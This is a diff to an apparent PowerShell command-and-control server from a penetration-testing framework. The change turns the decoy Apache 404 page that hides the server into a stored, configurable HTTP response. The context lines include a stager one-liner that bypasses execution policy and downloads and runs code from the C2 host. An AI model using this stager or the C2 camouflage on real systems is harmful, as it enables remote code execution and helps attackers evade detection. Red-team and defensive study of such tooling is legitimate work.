@@ -747,6 +747,7 @@ if ($args[0])
     $serverport = $c2serverresults.ServerPort 
     $shortcut = $c2serverresults.QuickCommand
     $downloaduri = $c2serverresults.DownloadURI
+    $httpresponse = $c2serverresults.HTTPResponse
 
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
     Write-Host "To quickly get setup for internal pentesting, run:"
@@ -820,7 +821,17 @@ else
     
     $downloaduri = Get-RandomURI -Length 5
     $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('http://$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
-
+    $httpresponse = '
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache (Debian) Server</address>
+</body></html>
+    '
     New-Item $global:newdir -Type directory | Out-Null
     New-Item $global:newdir\downloads -Type directory | Out-Null
     New-Item $global:newdir\reports -Type directory | Out-Null
@@ -876,6 +887,7 @@ else
         HostnameIP TEXT,
         DefaultSleep TEXT,
         KillDate TEXT,
+        HTTPResponse TEXT,
         FolderPath TEXT,
         ServerPort TEXT,
         QuickCommand TEXT,
@@ -892,13 +904,14 @@ else
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, FolderPath, ServerPort, QuickCommand, DownloadURI)
-            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI)'
+    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI)
+            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI)'
 
     Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
         DefaultSleep = $defaultbeacon
-        KillDate      = $killdatefm
+        KillDate = $killdatefm
         HostnameIP  = $ipv4address
+        HTTPResponse = $httpresponse
         FolderPath = $global:newdir
         ServerPort = $serverport
         QuickCommand = $shortcut
@@ -1683,18 +1696,7 @@ $message =[Convert]::ToBase64String($Bytes)
     }
     }
     # if a web request comes in that is not for the c2 server, send default 404 response
-    if (!$message) 
-    {$message = '
-    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-    <html><head>
-    <title>404 Not Found</title>
-    </head><body>
-    <h1>Not Found</h1>
-    <p>The requested URL was not found on this server.</p>
-    <hr>
-    <address>Apache (Debian) Server</address>
-    </body></html>
-    '}
+    if (!$message) {$message = $httpresponse}
     
     [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
     $response.ContentLength64 = $buffer.length
